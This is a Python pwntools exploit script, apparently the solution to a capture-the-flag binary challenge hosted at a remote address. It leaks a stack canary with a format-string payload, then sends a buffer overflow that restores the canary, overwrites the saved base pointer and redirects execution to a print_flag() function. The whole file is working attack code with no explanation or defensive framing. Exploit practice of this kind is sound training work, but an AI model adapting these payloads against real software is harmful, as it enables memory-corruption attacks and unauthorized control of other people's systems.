from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('rivit.dev', 10015)
    else:
        r = process('./task')

    # gdb.attach(r, 'b* 0x0000000000401324')
    payload = b'%9$lx'                              # address of 9th position in stack
    r.sendlineafter(': ', payload)
    canary_found = r.recv(16).decode()
    num = int(canary_found, 16)
    log.success(f"Canary value found: {hex(num)}")

    payload = b'A'*24                               # buffer
    payload += p64(num)                             # canary
    payload += b'B'*8                               # RBP register
    payload += b'\x1B\x12\x40'                      # print_flag()
    r.sendlineafter('Second: ', payload)
    r.interactive()
    r.close()

exploit(True)
